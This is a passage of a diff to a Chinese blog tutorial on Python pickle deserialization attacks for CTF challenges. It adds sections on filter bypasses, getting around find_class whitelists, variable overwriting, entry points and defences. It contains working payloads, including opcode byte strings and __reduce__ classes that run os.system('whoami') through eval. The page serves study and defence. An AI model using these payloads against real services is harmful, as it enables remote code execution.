+</span></span></code></pre></div><p><code>BUILD</code> 对模块对象会优先调用 <code>__setstate__</code>，如果对象没有这个，就会退回到兜底路径走 <code>inst.__dict__.update(state)</code> 这条路，于是 <code>secret.name</code> 被改成 <code>'btop251'</code>。</p>
+<p>这个思路在 CTF 里比 RCE 更常见，因为它绕过了 <code>find_class</code> 对危险函数的拦截——你只需要白名单里允许一个可写的模块/对象就行。</p>
+
+<h3 id="绕过过滤的常见技巧" data-numberify>绕过过滤的常见技巧<a class="anchor ms-1" href="#绕过过滤的常见技巧"></a></h3>
+<p>很多题目会对 pickle 字节流做黑名单过滤，比如禁止 <code>os</code>、<code>system</code>、<code>eval</code> 等字符串。常见的绕过方式：</p>
+<ol>
+<li><strong><code>getattr</code> 动态获取</strong>：<code>(getattr(os, &quot;system&quot;), (&quot;whoami&quot;,))</code>，函数在序列化时求值，字符串里的 <code>system</code> 可能躲过黑名单</li>
+<li><strong><code>__builtins__</code> 字典访问</strong>：<code>(eval, (&quot;__import__('os').system('whoami')&quot;,))</code> 里把字符串拆开拼接，躲过关键字匹配</li>
+<li><strong>使用 <code>BUILD</code> opcode</strong>：先构造对象实例，再通过 <code>BUILD</code> 设置其 <code>__dict__</code>，配合 <code>__setstate__</code> 触发</li>
+<li><strong><code>GLOBAL</code> 可以指向任意模块的属性</strong>：比如 <code>os.path</code>、<code>subprocess.Popen</code>，甚至 <code>builtins.__import__</code></li>
+<li><strong><code>REDUCE</code> 的替代</strong>：<code>NEWOBJ</code>、<code>OBJ</code>、<code>INST</code> 等 opcode 也能构造对象，<code>BUILD</code> 能触发状态设置</li>
+</ol>
+<p>一个经典的 <code>BUILD</code> 利用链：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="k">def</span> <span class="nf">__setstate__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">state</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">        <span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">state</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">
+</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1"># 反序列化时 __setstate__ 会被调用</span>
+</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;c__main__</span><span class="se">\n</span><span class="s2">Evil</span><span class="se">\n</span><span class="s2">)R(S&#39;cmd&#39;</span><span class="se">\n</span><span class="s2">S&#39;whoami&#39;</span><span class="se">\n</span><span class="s2">db.&#34;</span>
+</span></span></code></pre></div><p>逐条看：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">c__main__\nEvil\n   # GLOBAL：压入 Evil 类
+</span></span><span class="line"><span class="ln">2</span><span class="cl">)                   # EMPTY_TUPLE：压空元组
+</span></span><span class="line"><span class="ln">3</span><span class="cl">R                   # REDUCE：调用 Evil()，得到实例
+</span></span><span class="line"><span class="ln">4</span><span class="cl">(                   # MARK
+</span></span><span class="line"><span class="ln">5</span><span class="cl">S&#39;cmd&#39;              # 压 key
+</span></span><span class="line"><span class="ln">6</span><span class="cl">S&#39;whoami&#39;           # 压 value
+</span></span><span class="line"><span class="ln">7</span><span class="cl">d                   # DICT：组合成 {&#39;cmd&#39;: &#39;whoami&#39;}
+</span></span><span class="line"><span class="ln">8</span><span class="cl">b                   # BUILD：以 dict 为 state 触发 __setstate__
+</span></span></code></pre></div><p>这里 <code>)</code> + <code>R</code> 先实例化对象是关键，少了这一步 <code>BUILD</code> 作用在类对象上会直接报错。</p>
+
+<h3 id="find_classctf-的正面战场" data-numberify>find_class()：CTF 的正面战场<a class="anchor ms-1" href="#find_classctf-的正面战场"></a></h3>
+<p>官方对 pickle 安全问题的建议是改写 <code>pickle.Unpickler.find_class()</code>，用白名单限制能导入的模块和对象。所以 CTF 里 pickle 题 90% 的过滤点都在这个函数上，<strong>能不能绕过 <code>find_class</code> 基本决定了能不能拿分</strong>。</p>
+<p>先搞清楚它什么时候被调用：</p>
+<ul>
+<li><strong>opcode 角度</strong>：<code>c</code>（GLOBAL）、<code>i</code>（INST）、<code>STACK_GLOBAL</code>（<code>\x93</code>）这三个 opcode 在解析时会触发 <code>find_class()</code>。<code>STACK_GLOBAL</code> 仅在协议 4+ 中可用，手写 v0 payload 时用不到它，但阅读现代序列化数据时会遇到</li>
+<li><strong>调用次数</strong>：每个 opcode 只调一次。也就是说 <code>find_class()</code> 只需要<strong>过一次</strong>，之后在字节流里再产生的函数/对象即使命中黑名单也不会被二次拦截</li>
+</ul>
+<p>下面看两个典型的过滤与绕过。</p>
+<p><strong>例 1：只允许 <code>builtins</code>，但黑名单有漏网之鱼</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">safe_builtins</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;range&#39;</span><span class="p">,</span> <span class="s1">&#39;complex&#39;</span><span class="p">,</span> <span class="s1">&#39;set&#39;</span><span class="p">,</span> <span class="s1">&#39;frozenset&#39;</span><span class="p">,</span> <span class="s1">&#39;slice&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">blacklist</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;execfile&#39;</span><span class="p">,</span> <span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="s1">&#39;__import__&#39;</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s2">&#34;builtins&#34;</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">safe_builtins</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">&#34;global &#39;</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">&#39; is forbidden&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
+</span></span></code></pre></div><p>黑名单里没有 <code>getattr</code>，于是可以用 <code>getattr</code> 从 <code>builtins</code> 里“捞”出被禁的 <code>eval</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">builtins</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">        <span class="n">eval_func</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">)</span>   <span class="c1"># 序列化时求值，拿到 eval</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">eval_func</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;</span><span class="p">,))</span>
+</span></span></code></pre></div><p><code>find_class</code> 只看到 <code>builtins.eval</code> 这一次导入？不——<code>getattr(builtins, &quot;eval&quot;)</code> 在<strong>序列化时</strong>就已经执行完了，<code>__reduce__</code> 返回的第一个元素直接就是 <code>eval</code> 函数对象，pickle 只负责把函数对象序列化进去（通过 <code>GLOBAL</code> 导入 <code>builtins.eval</code>）。所以这个思路在 <code>find_class</code> 白名单只允许 <code>builtins</code> 时其实过不了 <code>eval</code> 这关——真正能过的是<strong>白名单里允许 <code>getattr</code> 本身</strong>时：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">getattr</span><span class="p">,</span> <span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">))</span>   <span class="c1"># ❌ 只返回 eval，不执行</span>
+</span></span></code></pre></div><p>要执行得再加一层：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">),</span> <span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;</span><span class="p">,))</span>  <span class="c1"># ✅</span>
+</span></span></code></pre></div><p>但 <code>getattr(builtins, &quot;eval&quot;)</code> 在序列化时求值，序列化出来还是 <code>builtins.eval</code> 的 <code>GLOBAL</code>，<code>find_class</code> 一样会拦。<strong>所以这条绕过真正生效的前提是白名单允许 <code>getattr</code> 这个 callable 本身被导入</strong>——比如 Code-Breaking 那题白名单里就有 <code>getattr</code>，于是可以用 <code>getattr(builtins, &quot;eval&quot;)</code> 在反序列化时动态取到 <code>eval</code> 再调用。</p>
+<p><strong>例 2：只允许 <code>__main__</code> 模块</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">],</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+</span></span></code></pre></div><p>看起来只允许主程序自己的对象，很安全。但<strong>被主程序 import 的模块都挂在 <code>__main__</code> 下</strong>——比如 <code>main.py</code> 里 <code>import secret</code>，那么 <code>__main__.secret</code> 就是那个模块对象，可以直接改：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="sa">b</span><span class="s2">&#34;c__main__</span><span class="se">\n</span><span class="s2">secret</span><span class="se">\n</span><span class="s2">(S&#39;name&#39;</span><span class="se">\n</span><span class="s2">S&#39;1&#39;</span><span class="se">\n</span><span class="s2">db.&#34;</span>
+</span></span></code></pre></div><p>这就是“变量覆盖”在 <code>find_class</code> 白名单下的经典打法。</p>
+<p><code>find_class</code> 只拦 <code>GLOBAL</code>/<code>INST</code> 的导入动作，不拦后续的 <code>REDUCE</code>/<code>BUILD</code>/<code>SETITEM</code>。所以绕过的核心思路要么是“找一个白名单里允许、但能间接拿到危险 callable 的跳板”（<code>getattr</code>、<code>globals</code>、<code>__builtins__</code>），要么是“根本不需要危险 callable，改数据就行”（变量覆盖）。</p>
+
+<h3 id="协议版本与环境差异" data-numberify>协议版本与环境差异<a class="anchor ms-1" href="#协议版本与环境差异"></a></h3>
+<p>pickle 有 0~5 共 6 个协议版本，手写 payload 一般用 v0，因为可读性最好，而且向下兼容（v0 在所有 Python 版本都能解析）。用 <code>pickle.dumps(obj, protocol=i)</code> 可以指定版本。</p>
+<p>环境差异也要注意：</p>
+<ul>
+<li><strong>Linux vs Windows</strong>：<code>os.system</code> 在 Linux 上序列化出来是 <code>cposix\nsystem\n</code>，Windows 上是 <code>cnt\nsystem\n</code>。手写 payload 用 <code>cos\nsystem\n</code> 最稳，因为 <code>os</code> 模块本身跨平台。<code>os.system</code> 在 CPython 中实际上定义在 <code>posix</code>（Unix）或 <code>nt</code>（Windows）模块里，只是被重新导出到 <code>os</code> 命名空间。手写 <code>cos\nsystem\n</code> 之所以跨平台，是因为 <code>os</code> 模块本身在所有平台上都存在，并且 <code>os.system</code> 总是可用的。</li>
+<li><strong>Python 2 vs Python 3</strong>：<code>GLOBAL</code> 的模块路径、字符串类型（<code>str</code> vs <code>bytes</code>）、<code>REDUCE</code> 的行为在部分细节上有差异，跨版本 payload 需要实测</li>
+</ul>
+
+<h3 id="实战中的入口" data-numberify>实战中的入口<a class="anchor ms-1" href="#实战中的入口"></a></h3>
+<p>Pickle 反序列化在 CTF 和真实场景中常见的入口：</p>
+<ul>
+<li><strong>Flask session</strong>：某些场景下 session 用 pickle 序列化（较少见，但存在）</li>
+<li><strong>缓存</strong>：Redis、Memcached 里存的是 pickle 字节流</li>
+<li><strong>RPC / 消息队列</strong>：Celery 默认用 pickle 序列化任务</li>
+<li><strong>文件上传</strong>：上传 <code>.pkl</code> 文件后被 <code>pickle.load()</code> 读取</li>
+<li><strong>Cookie</strong>：某些框架把 pickle 塞进 cookie</li>
+<li><strong><code>pickle.loads(request.data)</code></strong>：最直接的入口，题目里常见</li>
+</ul>
+
+<h3 id="防御" data-numberify>防御<a class="anchor ms-1" href="#防御"></a></h3>
+<ul>
+<li><strong>永远不要反序列化不可信数据</strong>，这是根本原则</li>
+<li>用 <code>json</code>、<code>msgpack</code> 等纯数据格式替代</li>
+<li>如果必须用 pickle，可以用 <code>pickle.Unpickler</code> 子类重写 <code>find_class()</code> 做白名单限制：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">class</span> <span class="nc">SafeUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s2">&#34;builtins&#34;</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&#34;str&#34;</span><span class="p">,</span> <span class="s2">&#34;int&#34;</span><span class="p">,</span> <span class="s2">&#34;list&#34;</span><span class="p">,</span> <span class="s2">&#34;dict&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">            <span class="k">return</span> <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;禁止导入 </span><span class="si">{</span><span class="n">module</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">
+</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="n">SafeUnpickler</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">data</span><span class="p">))</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
+</span></span></code></pre></div><ul>
+<li>或者用 <code>pickletools.genops()</code> 先做静态检查，黑名单过滤 <code>GLOBAL</code>、<code>REDUCE</code>、<code>BUILD</code> 等危险 opcode（但绕过方式很多，只能算缓解）</li>
+</ul>
 </div>
 </div>
 <div class="modal fade" id="rewardModal" tabindex="-1" aria-labelledby="rewardModalLabel" aria-hidden="true">
@@ -361,7 +745,7 @@ decimo的小窝
             </a>
           </li></ul>
         <div class="tab-content" id="rewardTabContent"><div class="tab-pane fade post-reward-content text-center show active" id="reward-wechat" role="tabpanel" aria-labelledby="reward-wechat-tab">
-            <img class="img-fluid post-reward-img" src="http://localhost:1313/images/wechat.jpg" loading="lazy" data-viewer-invisible />
+            <img class="img-fluid post-reward-img" src="https://decimo.top/images/wechat.jpg" loading="lazy" data-viewer-invisible />
           </div></div>
       </div>
     </div>
@@ -479,7 +863,7 @@ decimo的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="大难临头，出路何在？" src="http://localhost:1313/images/lw.png" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="大难临头，出路何在？" src="https://decimo.top/images/lw.png" loading="lazy"
      width="614"
      height="634"/>
   </picture>
@@ -503,7 +887,7 @@ decimo的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="Pickle反序列化" src="http://localhost:1313/images/pickle.jpg" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="Pickle反序列化" src="https://decimo.top/images/pickle.jpg" loading="lazy"
      width="960"
      height="540"/>
   </picture>
@@ -527,7 +911,7 @@ decimo的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="java" src="http://localhost:1313/images/java.jpg" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="java" src="https://decimo.top/images/java.jpg" loading="lazy"
      width="760"
      height="506"/>
   </picture>
@@ -551,7 +935,7 @@ decimo的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="计算机网络知识梳理" src="http://localhost:1313/images/network.jpg" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="计算机网络知识梳理" src="https://decimo.top/images/network.jpg" loading="lazy"
      width="480"
      height="300"/>
   </picture>
@@ -575,7 +959,7 @@ decimo的小窝
   <div class="d-flex">
       <div
         class="flex-shrink-0 d-flex justify-content-center align-items-center"
-        style="max-width: 100px"><picture><img class="img-fluid" alt="UOOC艺术的星空：艺术美学十二讲习题答案" src="http://localhost:1313/images/SZU.png" loading="lazy"
+        style="max-width: 100px"><picture><img class="img-fluid" alt="UOOC艺术的星空：艺术美学十二讲习题答案" src="https://decimo.top/images/SZU.png" loading="lazy"
      width="322"
      height="97"/>
   </picture>
@@ -621,6 +1005,16 @@ decimo的小窝
             <li><a href="#__reduce__-的返回值结构"><code>__reduce__()</code> 的返回值结构</a></li>
           </ul>
         </li>
+        <li><a href="#构造恶意-pickle">构造恶意 pickle</a></li>
+        <li><a href="#pvm栈memo-与-opcode-速查">PVM：栈、memo 与 opcode 速查</a></li>
+        <li><a href="#手写-opcode从单函数到多指令">手写 opcode：从单函数到多指令</a></li>
+        <li><a href="#不仅仅是-ossystem">不仅仅是 <code>os.system</code></a></li>
+        <li><a href="#变量覆盖">变量覆盖</a></li>
+        <li><a href="#绕过过滤的常见技巧">绕过过滤的常见技巧</a></li>
+        <li><a href="#find_classctf-的正面战场"><code>find_class()</code>：CTF 的正面战场</a></li>
+        <li><a href="#协议版本与环境差异">协议版本与环境差异</a></li>
+        <li><a href="#实战中的入口">实战中的入口</a></li>
+        <li><a href="#防御">防御</a></li>
       </ul>
     </li>
   </ul>
@@ -687,7 +1081,7 @@ decimo的小窝
         <i class="fa-fw fa-2x fab fa-github"
           ></i>
       </a>
-  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="http://localhost:1313/index.xml" title="RSS" rel="me">
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://decimo.top/index.xml" title="RSS" rel="me">
     <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
   </a>
 </nav>
@@ -695,8 +1089,8 @@ decimo的小窝
   <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
 </div>
 </footer>
-<script data-precache src="/assets/main/bundle.min.8b518cf106ba866e25249124a5e8cfc53bfe2eb4de4487e3bd0fe799ed61f458.js" integrity="sha256-i1GM8Qa6hm4lJJEkpejPxTv&#43;LrTeRIfjvQ/nme1h9Fg=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.cbea61263c4ff4af25077451650e39434ea61f115c240d221e2dc739ad82b60b.js" integrity="sha256-y&#43;phJjxP9K8lB3RRZQ45Q06mHxFcJA0iHi3HOa2Ctgs=" crossorigin="anonymous" defer></script>
-<script data-precache src="/assets/viewer/bundle.min.560dde3e6a332bcfb3c948907022a5a35751d968de94ab4ef36371ab392ed913.js" integrity="sha256-Vg3ePmozK8&#43;zyUiQcCKlo1dR2WjelKtO82Nxqzku2RM=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/main/bundle.min.28dd2d3072601810e6c4f2bba33b7fcb56216c0db23356903148d0018fbb8195.js" integrity="sha256-KN0tMHJgGBDmxPK7ozt/y1YhbA2yM1aQMUjQAY&#43;7gZU=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
 <script src="/js/toc-auto.635186e6d874d0dfed4a40f65dcc71e277a9772461a22e01fd1e5aabc804694d.js" integrity="sha256-Y1GG5th00N/tSkD2Xcxx4nepdyRhoi4B/R5aq8gEaU0=" crossorigin="anonymous" defer></script>
 <script src="/js/content-width.934f78874ee3ec7867ee4eb0d748e4532407370231346898fbe3108e92526acb.js" integrity="sha256-k094h07j7Hhn7k6w10jkUyQHNwIxNGiY&#43;&#43;MQjpJSass=" crossorigin="anonymous" defer></script>
 
